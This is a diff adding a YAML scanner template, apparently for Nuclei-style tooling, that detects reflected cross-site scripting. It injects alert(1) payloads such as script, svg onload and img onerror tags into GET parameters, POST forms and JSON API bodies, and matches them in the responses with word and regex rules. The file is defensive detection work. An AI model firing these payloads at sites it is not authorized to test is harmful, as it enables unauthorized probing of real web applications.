@@ -1,0 +1,108 @@
+id: xss-reflected
+info:
+  name: Reflected Cross-Site Scripting
+  severity: High
+  description: |
+    检测反射型XSS漏洞，通过注入测试payload并检查响应中是否包含未转义的payload。
+  author: Aegis Security Team
+  tags:
+    - xss
+    - injection
+    - client-side
+  reference:
+    - https://owasp.org/www-community/attacks/xss/
+
+requests:
+  # GET参数注入测试
+  - method: GET
+    preconditions:
+      methods: [GET]
+    path:
+      - "{{BaseURL}}/?q={{payload}}"
+      - "{{BaseURL}}/?search={{payload}}"
+      - "{{BaseURL}}/?query={{payload}}"
+      - "{{BaseURL}}/?id={{payload}}"
+      - "{{BaseURL}}/?name={{payload}}"
+      - "{{BaseURL}}/?input={{payload}}"
+      - "{{BaseURL}}/?page={{payload}}"
+      - "{{BaseURL}}/?url={{payload}}"
+      - "{{BaseURL}}/?redirect={{payload}}"
+      - "{{BaseURL}}/?next={{payload}}"
+    payload_sets:
+      default:
+        - "<script>alert(1)</script>"
+        - "<svg onload=alert(1)>"
+        - "<img src=x onerror=alert(1)>"
+      aggressive:
+        - "<script>alert(1)</script>"
+        - "<svg onload=alert(1)>"
+        - "<img src=x onerror=alert(1)>"
+        - "\"'><script>alert(1)</script>"
+        - "javascript:alert(1)"
+        - "<body onload=alert(1)>"
+        - "<iframe src=javascript:alert(1)>"
+        - "<details open ontoggle=alert(1)>"
+        - "<audio src=x onerror=alert(1)>"
+        - "<video><source onerror=alert(1)>"
+      stealthy:
+        - "aegis_probe"
+    matchers:
+      - type: word
+        words:
+          - "<script>alert(1)</script>"
+          - "<svg onload=alert(1)>"
+          - "<img src=x onerror=alert(1)>"
+        part: body
+        condition: or
+      - type: regex
+        regex:
+          - "<script[^>]*>[^<]*alert\\s*\\("
+          - "onerror\\s*=\\s*[\"']?alert"
+          - "onload\\s*=\\s*[\"']?alert"
+        part: body
+
+  # POST表单注入测试
+  - method: POST
+    preconditions:
+      methods: [POST]
+    path:
+      - "{{BaseURL}}/search"
+      - "{{BaseURL}}/submit"
+      - "{{BaseURL}}/api/search"
+      - "{{BaseURL}}/api/query"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: "q={{payload}}&submit=Search"
+    payload_sets:
+      default:
+        - "<script>alert(1)</script>"
+        - "<svg onload=alert(1)>"
+    matchers:
+      - type: word
+        words:
+          - "<script>alert(1)</script>"
+          - "<svg onload=alert(1)>"
+        part: body
+        condition: or
+
+  # JSON API注入测试
+  - method: POST
+    preconditions:
+      methods: [POST]
+    path:
+      - "{{BaseURL}}/api/v1/search"
+      - "{{BaseURL}}/api/v2/query"
+    headers:
+      Content-Type: "application/json"
+    body: '{"query": "{{payload}}", "limit": 10}'
+    payload_sets:
+      default:
+        - "<script>alert(1)</script>"
+        - "<img src=x onerror=alert(1)>"
+    matchers:
+      - type: word
+        words:
+          - "<script>alert(1)</script>"
+          - "<img src=x onerror=alert(1)>"
+        part: body
+        condition: or
